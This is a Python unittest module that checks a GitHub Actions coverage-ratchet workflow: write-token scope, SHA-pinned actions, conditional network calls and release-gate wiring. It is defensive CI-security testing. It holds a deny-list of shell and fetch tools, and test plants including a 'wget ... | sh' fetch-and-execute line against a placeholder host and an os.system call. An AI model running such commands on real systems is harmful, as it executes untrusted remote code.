

"""Invariants over coverage-ratchet.yml — the release-gate surface.

    python3 -m unittest discover -v


WHAT THIS MODULE OWNS. Everything about `.github/workflows/coverage-ratchet.yml`
and its coupling to `.github/workflows/release.yml`: what the workflow is allowed
to run in the job that holds the repository's only `contents: write` token, which
of its jobs can block a release, what its check run is called, and what the
measured population in `tests.yml` has to be. It also owns the small structural
reader those cases are written against.


WHY IT IS A SEPARATE MODULE, and why not to merge it back. `test_ci_workflows.py`
holds the invariants that predate this file and was already the largest module in
the suite; this is a different workflow with a different trust question, and it
grew on top of an unrelated ceiling until the two were one file and that file was
over the limit. The split is by SURFACE, not by convenience: `test_ci_workflows.py`
keeps what was always there, and everything about this one workflow is here.
Merging them back re-creates the same problem at the next addition.


Stdlib unittest, matching the rest of this repo's suite.
"""
import json
import re
import unittest
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parent
WORKFLOWS = REPO_ROOT / ".github" / "workflows"


RATCHET_WORKFLOW = WORKFLOWS / "coverage-ratchet.yml"
PINNED_USE = re.compile(r"^\s*-?\s*uses:\s*[\w.-]+/[\w.-]+@[0-9a-f]{40}"
                        r"\s+#\s+v[0-9][0-9A-Za-z.\-]*$")


USES_LINE = re.compile(r"^\s*-?\s*uses:")
# release.yml's manifest, parsed with the same shape its own
# test_release_workflow.py uses: twelve spaces, the gate name, a `#` comment
# naming the workflow file and the job the entry is written against. The
# comment is load-bearing, not decoration — this is the only reader of it
# here, and a manifest entry that loses it is invisible.
MANIFEST_ENTRY = re.compile(
    r"^ {12}([a-z][a-z-]*)\s+# (\S+\.yml), job `([a-z][a-z-]*)`"
    r"(?: \([^)]*\))?$", re.MULTILINE)


# The step that writes the floor. Named here so a case reads the one step it
# means rather than whichever one happens to be second.
WRITE_STEP_NAME = "Raise the floor if coverage climbed"
# A shell statement that INVOKES `gh api`, guarded or not — as opposed to one
# that merely names it in a message. The optional `if ` is what makes this the
# conditional form, so a bare call is matched by the same pattern and then
# rejected by the assertion that reads the match.
GH_API_CALL = re.compile(r"^(?:if |if ! )?gh api\b")
# What the job holding the repository's only write token may never do. Not a
# list of the tools that were planted in it — a deny-list of three is defeated
# by a fourth interpreter or a renamed script, and the point of the case using
# this is that it is not defeated that way. Read it as "this job must not
# EXECUTE anything and must not reach into a tree", which is the property the
# workflow's own comment claims, rather than as an inventory of today.
#
# The shell entries are SHELL-SPELLINGS, not bare names, and that is not
# fastidiousness: `"sh "` matches "push to main" — which this file's own step
# summary says — so a broad token both misses a real invocation written
# differently and fires on ordinary English.
WRITE_JOB_FORBIDDEN = (
    "python",      # any interpreter, in any spelling: python3, python3.13
    "bash", "sh -c", "/bin/sh", "/bin/bash", "zsh", "node", "perl", "ruby",
    "env ", "eval", "exec", "curl", "wget", "ssh",
    "scripts/",    # a path into the repository
    ".py", "requirements", "./", "../",


)
# --- structural reads over a workflow file --------------------------------
#
# These read BLOCK STRUCTURE — indentation and key names — not prose. "Which
# job declares this permission" is a question about nesting, and a substring
# search would also match the sentence in the comment that explains the
# permission; so would one that read a top-level key as though it were a
# job's. Every comment line is dropped, because a comment is not a
# declaration, and that is also why a case here cannot be satisfied by
# someone writing a reassuring sentence in a comment.


def _indent_of(line):
    return len(line) - len(line.lstrip(" "))


def _records(text):
    """[(indent, content)] for the lines that carry YAML.

    Blank lines and whole-line comments are dropped. Comment lines are
    explanation, and including them here would let a `# permissions:` line
    read as a key.
    """
    out = []
    for line in text.splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            out.append((_indent_of(line), stripped))
    return out


def _partition(content):
    """(key, value) at the first `:` outside quotes. value may be ''.

    The space rule matters: `uses: a/b@sha # v1` splits at `uses:`, while a
    colon inside a URL or a glob does not start a nested block.
    """
    quote = None
    for index, character in enumerate(content):
        if quote:
            if character == quote:
                quote = None
        elif character in "'\"":
            quote = character
        elif character == ":" and (index + 1 == len(content)
                                   or content[index + 1] in " \t"):
            return content[:index].strip(), content[index + 1:].strip()
    return content.strip(), ""


def _without_comment(value):
    """The scalar with a trailing `# ...` removed, quotes respected."""
    quote = None
    for index, character in enumerate(value):
        if quote:
            if character == quote:
                quote = None
        elif character in "'\"":
            quote = character
        elif character == "#" and (index == 0 or value[index - 1] in " \t"):
            return value[:index].strip()
    return value.strip()


def _block(records, indent, key):
    """The records nested under `key` at `indent`; [] for a scalar or absent."""
    for index, (at, content) in enumerate(records):
        if at != indent or content.startswith("- "):
            continue
        name, value = _partition(content)
        if name != key:
            continue
        if value:
            return []          # a scalar carries no nested block
        start = index + 1
        if start >= len(records) or records[start][0] <= indent:
            return []
        end = start
        while end < len(records) and records[end][0] > indent:
            end += 1
        return records[start:end]
    return []


def _value(records, indent, key):
    """The scalar at `key`/`indent`, comment stripped; None if absent.

    FIRST-WINS, deliberately, and that is a difference from YAML rather than a
    detail. A duplicate key is a file GitHub rejects outright, so there is
    nothing to be wrong about in a live workflow; what matters is that the
    asymmetry fails LOUDLY rather than quietly — reading a later duplicate
    would let a `contents: read` line placed under a `contents: write` one
    pass as read-only, and reading nothing at all would make the guard
    unfalsifiable. One line, so a reader does not have to rediscover it.
    """
    for at, content in records:
        if at != indent or content.startswith("- "):
            continue
        name, value = _partition(content)
        if name == key:
            return _without_comment(value)
    return None


def _mapping(records):
    """{key: scalar} for a mapping block's own entries.

    Reading the WHOLE mapping rather than one key is what makes a second
    write scope visible: a job holding `contents: write` and `issues: write`
    is not a job holding `contents: write`.
    """
    if not records:
        return {}
    indent = records[0][0]
    out = {}
    for at, content in records:
        if at != indent or content.startswith("- "):
            continue
        name, value = _partition(content)
        out[name] = _without_comment(value)
    return out


def _child_value(block, key):
    """A mapping entry's own scalar, at whatever indent its children sit."""
    if not block:
        return None
    return _value(block, block[0][0], key)


def _flow_list(value):
    """`[a, b]` as a list of strings; [] for an absent or non-sequence."""
    if not value:
        return []
    inner = value.strip()
    if not (inner.startswith("[") and inner.endswith("]")):
        return [inner]
    inner = inner[1:-1].strip()
    if not inner:
        return []
    return [item.strip().strip("'\"") for item in inner.split(",")]


def _jobs(text):
    """{job name: that job's own records}, from the file's `jobs:` block."""
    body = _block(_records(text), 0, "jobs")
    out = {}
    current = None
    for indent, content in body:
        if indent == 2 and not content.startswith("- "):
            current = _partition(content)[0]
            out[current] = []
        elif current is not None:
            out[current].append((indent, content))
    return out


def _write_step():
    """The ratchet workflow's write step — the one that PUTs the floor.

    Found by its step NAME rather than by position, so a step inserted above it
    does not silently start being the thing these cases read.
    """
    steps = _steps(_jobs(
        RATCHET_WORKFLOW.read_text(encoding="utf-8"))["raise"])
    named = [step for step in steps if step["name"] == WRITE_STEP_NAME]
    if len(named) != 1:
        raise AssertionError(f"expected one {WRITE_STEP_NAME!r} step, "
                             f"found {[step['name'] for step in steps]}")
    return named[0]


def _steps(job):
    """[{name, uses, body, with}] for one job's step list.

    `body` is every record under the step, and `with` is the nested block of
    its inputs — a step's input cannot be read without knowing which block it
    sits in, and `persist-credentials` under a neighbouring key would not be
    this step's.
    """
    for indent, content in job:
        if _partition(content)[0] == "steps" and content.rstrip().endswith(":"):
            block = _block(job, indent, "steps")
            break
    else:
        return []
    if not block:
        return []
    base = block[0][0]
    out = []
    current = None
    for at, content in block:
        if at == base and content.startswith("- "):
            name, value = _partition(content[2:])
            current = {"name": value or name,
                       "uses": (_without_comment(value) or None
                                if name == "uses" else None),
                       "body": [], "with": []}
            out.append(current)
        elif current is not None:
            current["body"].append((at, content))
    for step in out:
        with_indent = next((at for at, content in step["body"]
                            if content == "with:"), None)
        if with_indent is not None:
            step["with"] = _block(step["body"], with_indent, "with")
    return out


def _run_lines(step):
    """A step's `run:` block as raw stripped lines.

    `_command` folds the block into one string, which is right for matching a
    command and wrong for asking a question about WHICH LINE something is on —
    "is every network call conditional" is a question about lines.
    """
    out, run_indent = [], None
    for at, content in step["body"]:
        if run_indent is not None:
            if at <= run_indent:
                break
            out.append(content)
            continue
        if _partition(content)[0] == "run":
            run_indent = at
    return out


def _command(step):
    """A step's `run:` block as one line, continuations joined.

    Read from the step's own body and only from the lines nested under its
    `run:` key, so an `if:` or an `env:` above it is not mistaken for shell.

    The whitespace is normalised AFTER the continuation backslash is folded
    out, and both steps are load-bearing: joining first and normalising after
    turns `pip \\` + `install` into `pip  install` — two spaces — which
    `assertNotIn("pip install")` reads as an absent string. A guard built on
    a spelling the caller controls is not a guard.
    """
    lines = []
    run_indent = None
    for at, content in step["body"]:
        if run_indent is not None:
            if at <= run_indent:
                break
            lines.append(content)
            continue
        key, value = _partition(content)
        if key == "run":
            run_indent = at
            if value not in ("|", ">", "|-", ">-"):
                lines.append(value)
    joined = re.sub(r"\\\s*", " ", " ".join(lines))
    return re.sub(r"\s+", " ", joined).strip()


class TestTheWorkflowReader(unittest.TestCase):
    """The reader itself, on the shapes it is known to reshape.

    Each case below exists because the thing it pins was a demonstrated false
    green in this file, not because the reader is interesting.
    """

    def test_a_line_continued_command_normalises_to_single_spaces(self):
        # Without the whitespace pass, `pip \` + `install` joins to
        # `pip  install` — and then `assertNotIn("pip install")` is reading a
        # spelling the file under test chose. Asserted directly rather than
        # only through a planted command, so dropping EITHER normalisation
        # step is caught here instead of at the next mutation round.
        step = {"body": [(4, "run: |"), (6, "python3 -m pip \\"),
                         (6, "install --upgrade requests")]}
        self.assertEqual(_command(step),
                         "python3 -m pip install --upgrade requests")

    def test_a_command_keeps_the_quotes_it_was_written_with(self):
        # Quoting is content, not noise: `--omit='test_*.py'` and
        # `--omit=test_*.py` are the same shell word but different text, and a
        # reader that strips quotes would make the two indistinguishable to
        # every case that matches on the flag.
        step = {"body": [(4, "run: python -m coverage run --omit='test_*.py'")]
                }
        self.assertEqual(_command(step),
                         "python -m coverage run --omit='test_*.py'")

    def test_an_env_block_above_run_is_not_read_as_shell(self):
        # The part a naive implementation gets wrong: `run:` is a key among
        # siblings, and its block is only the lines nested under it.
        step = {"body": [(4, "env:"), (6, "SECRET: $(cat token)"),
                         (4, "if: success()"),
                         (4, "run: echo hi")]}
        self.assertEqual(_command(step), "echo hi")

    def test_a_mapping_reads_every_entry_not_just_the_first(self):
        self.assertEqual(_mapping([(6, "contents: write"), (6, "issues: write")]),
                         {"contents": "write", "issues": "write"})

    def test_a_flow_sequence_reads_as_a_list(self):
        self.assertEqual(_flow_list("[main]"), ["main"])
        self.assertEqual(_flow_list("[main, release]"), ["main", "release"])
        self.assertEqual(_flow_list("[]"), [])
        self.assertEqual(_flow_list(None), [])


class TestCoverageRatchetWorkflow(unittest.TestCase):
    """The write half of the coverage ratchet, read as structure.

    Every case here is about a JOB or a BLOCK, not about a sentence. The
    file is the only workflow in this repository that holds `contents: write`
    for a routine push, so the questions are: what makes it run, which job
    holds the token, and whether the token is anywhere near the code a pull
    request could change.
    """

    @classmethod
    def setUpClass(cls):
        cls.text = RATCHET_WORKFLOW.read_text(encoding="utf-8")
        cls.jobs = _jobs(cls.text)

    def test_it_runs_on_a_push_to_main_and_on_nothing_else(self):
        # The finite event domain is what this file DECLARES, so the
        # enumeration comes from the trigger block rather than from a list of
        # events someone remembered to check. A `pull_request` added later
        # would give a same-repository PR this job's write scope.
        records = _records(self.text)
        triggers = _block(records, 0, "on")
        names = {_partition(content)[0] for at, content in triggers
                 if at == 2 and not content.startswith("- ")}
        self.assertEqual(names, {"push"})
        push = _block(triggers, 2, "push")
        branches = _flow_list(_child_value(push, "branches"))
        self.assertEqual(branches, ["main"])

    def test_exactly_one_job_holds_a_write_token_and_it_is_raise(self):
        # Any `write` scope in ANY job, not just `contents`: a job holding
        # `contents: write` and `issues: write` is not a job holding
        # `contents: write`, and a guard that probes one key cannot see the
        # difference.
        writers = {
            job for job, records in self.jobs.items()
            if "write" in _mapping(_block(records, 4, "permissions")).values()}
        self.assertEqual(writers, {"raise"})

    def test_the_write_job_holds_exactly_one_scope(self):
        self.assertEqual(
            _mapping(_block(self.jobs["raise"], 4, "permissions")),
            {"contents": "write"})

    def test_the_workflow_itself_is_read_only(self):
        records = _records(self.text)
        self.assertEqual(_child_value(_block(records, 0, "permissions"),
                                      "contents"), "read")

    def test_the_write_job_runs_only_after_the_measuring_job(self):
        # `needs` is what keeps the token out of the job that installs a test
        # toolchain and runs the suite. A ratchet that measured and wrote in
        # one job would hold the token while executing this repository's code.
        self.assertEqual(_value(self.jobs["raise"], 4, "needs"), "measure")
        self.assertIsNone(_value(self.jobs["measure"], 4, "needs"))

    def test_the_measuring_job_declares_no_write_scope_of_its_own(self):
        # An event trigger inherits the JOB's permissions; the measure job
        # declares none, so it runs on the file's top-level `contents: read`.
        self.assertEqual(_block(self.jobs["measure"], 4, "permissions"), [])

    def test_the_write_job_installs_nothing_and_runs_no_suite(self):
        # The named hazards, kept as negators even though the closed-grammar
        # case below is the general gate: a test whose name names a tool is
        # the one a reader checks first.
        commands = [_command(step)
                    for step in _steps(self.jobs["raise"])]
        for command in commands:
            with self.subTest(command=command):
                self.assertNotIn("pip install", command)
                self.assertNotIn("unittest", command)
                self.assertNotIn("coverage run", command)

    def test_the_write_job_has_no_checkout_and_runs_no_interpreter(self):
        """The claim on the raise job, checked.

        The file asserts that nothing a pull request can change executes
        while this token is live. That is only true if there is no tree on
        disk to execute from, so the assertion is about ABSENCE — a checkout
        step, and any interpreter invocation — not about a list of the three
        tools that happen to be named today. A fourth interpreter, or a
        renamed script, defeats a deny-list; it cannot defeat this.
        """
        steps = _steps(self.jobs["raise"])
        self.assertEqual(
            [step["uses"] for step in steps
             if (step["uses"] or "").startswith("actions/checkout@")],
            [], "the write job must not have a tree to execute from")
        for step in steps:
            command = _command(step)
            if not command:
                continue
            for forbidden in WRITE_JOB_FORBIDDEN:
                with self.subTest(step=step["name"], token=forbidden):
                    self.assertNotIn(forbidden, command)

    def test_the_candidate_floor_is_computed_in_the_read_only_job(self):
        # The raise job writes a file the measure job decided on. If the
        # decision moved back into the write job, the closed-grammar case
        # above would fire — this names the shape the file is actually in,
        # so the two are not silently inverted.
        command = _command(
            next(step for step in _steps(self.jobs["measure"])
                 if step["name"] == "Compute the candidate floor"))
        self.assertIn("--floor-file candidate-coverage-floor.json", command)
        uploads = [step for step in _steps(self.jobs["measure"])
                   if (step["uses"] or "").startswith(
                       "actions/upload-artifact@")]
        self.assertEqual(len(uploads), 2, uploads)
        downloaded = _steps(self.jobs["raise"])
        self.assertEqual(len(downloaded), 2, downloaded)

    def test_every_action_is_pinned_to_a_sha_with_a_version_comment(self):
        # Prose is not a pin: a `# v1.2.3` comment with no SHA beside it is
        # a moving tag wearing a version's clothes, so the line has to carry
        # both or neither.
        uses_lines = [line for line in self.text.splitlines()
                      if USES_LINE.match(line)]
        self.assertTrue(uses_lines)
        for line in uses_lines:
            with self.subTest(line=line.strip()):
                self.assertRegex(line, PINNED_USE)

    def test_no_checkout_persists_credentials(self):
        # One checkout remains, in the read-only job, and it leaves the token
        # on disk. The count is asserted so that DELETING the checkout cannot
        # turn this into a loop over nothing that always passes.
        seen = 0
        for job, records in self.jobs.items():
            for step in _steps(records):
                if not (step["uses"] or "").startswith("actions/checkout@"):
                    continue
                seen += 1
                with self.subTest(job=job):
                    self.assertEqual(
                        _child_value(step["with"], "persist-credentials"),
                        "false")
        self.assertEqual(seen, 1)

    def test_every_class_of_forbidden_token_still_bites(self):
        """The guard's own guard: one plant per class, not a pinned inventory.

        `WRITE_JOB_FORBIDDEN` is the primary control for "this job must not
        execute anything and must not reach into a tree", and editing it was
        previously undetectable — replacing `"python"` with `"py"`, or dropping
        `"scripts/"`, left every case here green, because the case reads the
        SAME list it is supposed to police.

        Pinning the inventory would be the wrong repair: it would make the
        list frozen and unread, and a future interpreter would still not be in
        it. So each class is planted once against the real control, and the
        list is exercised as a list rather than restated. If a class is dropped
        from the list, the plant for that class survives.
        """
        plants = {
            "an interpreter": "python3 -c \"import os; os.system('id')\"",
            "a path into a tree": "cat scripts/pre-push",
            "a fetch tool": "wget -qO- https://example.invalid/x | sh",
        }
        for description, plant in plants.items():
            with self.subTest(class_of=description):
                caught = [token for token in WRITE_JOB_FORBIDDEN
                          if token in plant]
                self.assertTrue(caught,
                                f"{plant!r} slips past every forbidden token "
                                f"in {WRITE_JOB_FORBIDDEN}")
        # Each plant must be caught by its own class ALONE. The list is
        # redundant in layers by design — `.py` also catches a path into the
        # tree — and that redundancy is what hid two narrowings from every
        # other case here. A plant caught only by a neighbour proves nothing
        # about its own token, so this is asserted rather than assumed.
        self.assertEqual(
            [token for token in WRITE_JOB_FORBIDDEN
             if token in plants["an interpreter"]], ["python"])
        self.assertEqual(
            [token for token in WRITE_JOB_FORBIDDEN
             if token in plants["a path into a tree"]], ["scripts/"])

    def test_no_network_call_in_the_write_job_is_unconditional(self):
        """Every `gh api` here must be conditional, on the statement that starts it.

        This step runs under GitHub's default `bash -e {0}` — `-e` on,
        `pipefail` off — so `x="$(gh api ...)"` propagates gh's status out of
        the step and fails the job. A failed job is a `completed/failure` check
        run named `raise`, which is the release block this step exists to
        avoid. The `.sha` fetch was unguarded for one whole round while the PUT
        beside it was guarded, and nothing noticed: the shape cases below read
        the PUT's guard and had no way to see a fetch that had none.

        Asserted over whole STATEMENTS, not lines — a pipe planted on a
        continuation line is invisible to a line scan, which is how my first
        version of this case missed one — and over the COUNT as well as the
        shape, so deleting a guarded call outright is as loud as leaving one
        unguarded. Comment lines are skipped: this file's own comments name
        `gh api` more often than its code does.
        """
        statements, current = [], []
        for line in _run_lines(_write_step()):
            if line.strip().startswith("#"):
                continue
            current.append(line.strip())
            if not line.strip().endswith("\\"):
                statements.append(" ".join(current))
                current = []
        if current:
            statements.append(" ".join(current))

        # A statement INVOKES gh api; a statement that merely mentions it —
        # `handled "…or gh api failed…"` — does not, and counting those made
        # this case fail on its own error message.
        calls = [s for s in statements if GH_API_CALL.match(s)]
        self.assertEqual(len(calls), 2, calls)
        for call in calls:
            self.assertTrue(
                call.startswith("if "),
                f"a network call starts outside a conditional: {call!r}")
            self.assertNotIn("|", call,
                             "a network call rides a pipeline, whose status is "
                             "its LAST stage — the first stage's failure would "
                             "be masked")
            self.assertNotIn("$(gh api", call,
                             "a gh api result is consumed by an assignment, "
                             "which -e turns into a step failure")

    def test_the_write_step_cannot_take_the_job_down(self):
        """A failed PUT must not fail `raise`, and therefore not a release.

        `raise`'s check run is not in release.yml's manifest, so a red one
        refuses the release — which would block it on the workflow's own
        compare-and-swap, the outcome it calls correct. The step therefore
        tolerates the failure loudly: stderr, a dated line in the step
        summary, exit 0.

        Asserted on the SHAPE rather than on the presence of a word, because the
        two ways this can silently come back are the same failure: a step that
        runs the PUT unguarded again, and a step that guards it and then exits
        non-zero anyway.
        """
        command = _command(_write_step())
        self.assertIn("exit 0", command)
        # The tolerance has to wrap the write, not merely follow it: a step
        # that tolerates and then still falls off the end under `bash -e`
        # reports the PUT's exit status anyway.
        self.assertRegex(command, r"if gh api --method PUT")
        # A stderr line alone is the version that is lost: the durable record
        # is the annotation, because that is what survives the log scrollback.
        self.assertIn("GITHUB_STEP_SUMMARY", command)
        self.assertIn("NOT raised", command)
        # And the write itself must remain a compare-and-swap, or the
        # tolerance would be covering a blind overwrite.
        self.assertIn("-f sha=", command)
        # Over the WHOLE step, not the PUT's tail: the shared `handled()`
        # path is where every guard routes, so a non-zero exit there turns
        # each of them back into the release block this case exists to
        # prevent — and a mutation that changed `handled()` alone looked fine
        # to every assertion aimed at the PUT.
        self.assertNotIn("exit 1", command,
                         "the step must have no path that exits non-zero")

    def test_the_write_step_does_not_fail_the_job_for_any_put_error(self):
        """The guard covers the whole call, not one branch of it.

        A mutation that moves the `if` so it only guards a `gh api` that
        succeeds is the same defect as removing it, and this is what separates
        those two from a comment that says the right thing.
        """
        command = _command(_write_step())
        tail = command[command.index("if gh api --method PUT"):]
        self.assertIn("fi", tail, "the PUT's failure branch is not closed")
        # Nothing between the guard and the closing `fi` may re-propagate: no
        # bare re-run of the same command, and no `exit 1`.
        self.assertNotIn("exit 1", tail)

    def test_the_check_run_name_is_the_release_manifest_entry(self):
        """The manifest entry is written against a check-run name.

        A job with no `name:` key reports under its JOB KEY, so dropping the
        key does not fail any assertion anywhere — the entry simply stops
        matching and every release waits out its deadline for a gate that
        does not exist. Presence is therefore asserted here, because the
        control that already exists only polices a job that renames itself
        to the WRONG name, and is silent about one that renames itself to
        nothing. Both halves are read from the two real files.
        """
        jobs = _jobs(RATCHET_WORKFLOW.read_text(encoding="utf-8"))
        check_run = _value(jobs["measure"], 4, "name")
        self.assertIsNotNone(
            check_run, "the measure job renames no check run, so it reports "
                       "as `measure` and the manifest entry matches nothing")

        release = (WORKFLOWS / "release.yml").read_text(encoding="utf-8")
        entries = dict(
            (gate, (workflow_file, job)) for gate, workflow_file, job
            in MANIFEST_ENTRY.findall(release))
        self.assertIn("coverage-ratchet", entries,
                      "the ratchet is a release gate and must be in the "
                      "manifest, not in a workflow's exclusion list")
        workflow_file, job = entries["coverage-ratchet"]
        self.assertEqual(workflow_file, RATCHET_WORKFLOW.name)
        self.assertEqual(job, "measure",
                         "the manifest names a job that does not exist")
        # The entry is keyed on the CHECK RUN, and a job that renames itself
        # to the wrong string is as invisible to the release as one that
        # renames itself to nothing.
        self.assertEqual(
            check_run, "coverage-ratchet",
            f"the manifest entry 'coverage-ratchet' would never match the "
            f"check run {check_run!r}")

    def test_a_newer_main_supersedes_an_in_flight_raise(self):
        records = _records(self.text)
        concurrency = _block(records, 0, "concurrency")
        self.assertEqual(
            _value(concurrency, 2, "group"),
            "coverage-ratchet-${{ github.ref }}")
        self.assertEqual(_value(concurrency, 2, "cancel-in-progress"), "true")

    def test_the_workflow_measures_the_cell_the_committed_floor_names(self):
        # The floor names one cell (coverage-floor.json's `cell`). A second
        # interpreter build here would make the floor a comparison between
        # cells rather than between trees.
        floor = json.loads((REPO_ROOT / "coverage-floor.json")
                           .read_text(encoding="utf-8"))
        expected = floor["cell"].split("/ ")[1].strip()
        versions = set()
        for records in self.jobs.values():
            for _at, content in records:
                name, value = _partition(content)
                if name == "python-version":
                    versions.add(_without_comment(value))
        self.assertEqual(versions, {f'"{expected}"'})


class TestCoverageGateInvokesTheRatchet(unittest.TestCase):
    """tests.yml's measured cell asks the ratchet the question."""

    @classmethod
    def setUpClass(cls):
        cls.text = (WORKFLOWS / "tests.yml").read_text(encoding="utf-8")
        steps = _steps(_jobs(cls.text)["unittest"])
        cls.by_name = {step["name"]: step for step in steps}

    def test_the_gate_step_calls_the_repository_entry_point(self):
        command = _command(self.by_name["Coverage gate"])
        self.assertEqual(
            command,
            "python scripts/ci/coverage_ratchet.py gate "
            "--coverage-json coverage.json")

    def test_no_fail_under_literal_is_left_anywhere(self):
        # The hand-edited literal is what this replaced. An unused second
        # floor left in the file is worse than none: it reads like the gate
        # and raises nothing, and the flag literal cannot be prose.
        self.assertNotIn("--fail-under", self.text)

    def test_the_measured_population_keeps_scripts_in_it(self):
        # scripts/ runs in workflows, so omitting it reported coverage for a
        # smaller program than the one that ships.
        command = _command(self.by_name["Run tests"])
        self.assertIn("--source=.", command)
        self.assertIn("--omit='test_*.py'", command)
        self.assertNotIn("scripts/*", command)

    def test_the_measured_cell_emits_the_json_the_gate_reads(self):
        summary = _command(self.by_name["Coverage summary"])
        self.assertIn("python -m coverage json -o coverage.json", summary)
        # The human table is not the gate's input; both come from the same
        # run, and only one of them is a number the script can compare.
        self.assertIn("python -m coverage xml -o coverage.xml", summary)


if __name__ == "__main__":
    unittest.main()
